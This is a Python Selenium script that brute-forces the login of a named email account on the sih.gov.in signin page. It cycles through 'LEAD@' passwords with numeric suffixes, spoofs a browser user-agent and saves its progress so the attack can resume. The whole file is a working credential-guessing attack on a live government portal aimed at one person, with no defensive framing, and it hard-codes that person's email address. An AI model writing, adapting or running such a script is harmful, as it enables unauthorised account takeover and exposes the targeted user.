from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.edge.options import Options
import time
import os

# Path to your Edge WebDriver (update the path accordingly)
driver_path = r"C:\Users\pheno\Downloads\Zips\edgedriver_win64\msedgedriver.exe"

# URL of the login page
url = 'https://sih.gov.in/signin'

# User's email
email = 'atishaytuliaf@gmail.com'

# User role option text
user_role = 'Team Leader'

# Optimized: Password pattern
password_base = 'LEAD@'

# File to store the last attempted password
state_file = 'last_attempted_password.txt'

# Function to save the last attempted password
def save_last_attempted_password(password):
    with open(state_file, 'w') as file:
        file.write(password)

# Function to load the last attempted password
def load_last_attempted_password():
    if os.path.exists(state_file):
        with open(state_file, 'r') as file:
            return file.read().strip()
    return None

# Function to attempt login
def attempt_login(driver, email, password):
    try:
        driver.get(url)

        # Wait for the page to load
        wait = WebDriverWait(driver, 20)  # Increase wait time to 20 seconds

        # Check if the login form is present
        wait.until(EC.presence_of_element_located((By.NAME, 'email')))

        # Find and fill the email field
        email_field = driver.find_element(By.NAME, 'email')
        email_field.send_keys(email)
        
        # Find and fill the password field
        password_field = driver.find_element(By.NAME, 'password')
        password_field.send_keys(password)
        
        # Find and select the user role from the dropdown
        role_dropdown = Select(driver.find_element(By.XPATH, "//select[@name='role']"))
        role_dropdown.select_by_visible_text(user_role)

        # Wait for a short period to allow page response
        time.sleep(2)

        # Find and click the submit button
        submit_button = driver.find_element(By.ID, 'edit-submit')
        submit_button.click()

        # Check if the login was successful
        if "Dashboard" in driver.page_source:
            print(f"Login successful with password: {password}")
            return True
        else:
            print(f"Login failed with password: {password}")
            return False
    except Exception as e:
        print(f"Error during login attempt: {e}")
        return False

# Main function to iterate over password range
def main():
    # Set up Edge options to mimic a real user
    edge_options = Options()
    edge_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36")
    
    # Initialize the Edge WebDriver
    driver = webdriver.Edge( options=edge_options)

    # Load the last attempted password
    last_attempted_password = load_last_attempted_password()
    
    start_prefix = '11'  # Default starting prefix
    start_suffix = 0

    if last_attempted_password:
        start_prefix = last_attempted_password[4:6]
        start_suffix = int(last_attempted_password[6:]) + 1
        print(f"Resuming from prefix: {start_prefix}, suffix: {start_suffix}")

    # Loop through prefixes 11, 22, 33, ..., 99
    for prefix in range(int(start_prefix), 100, 11):
        prefix_str = f'{prefix:02}'
        for suffix in range(start_suffix, 100):
            password = f'{password_base}{prefix_str}{suffix:02}'  # Formats suffix to 2 digits
            
            if attempt_login(driver, email, password):
                break
            
            # Save the last attempted password
            save_last_attempted_password(password)
            
            # Refresh for next attempt
            driver.refresh()
        
        # Reset suffix for next prefix
        start_suffix = 0
    
    # Close the driver
    driver.quit()

if __name__ == "__main__":
    main()
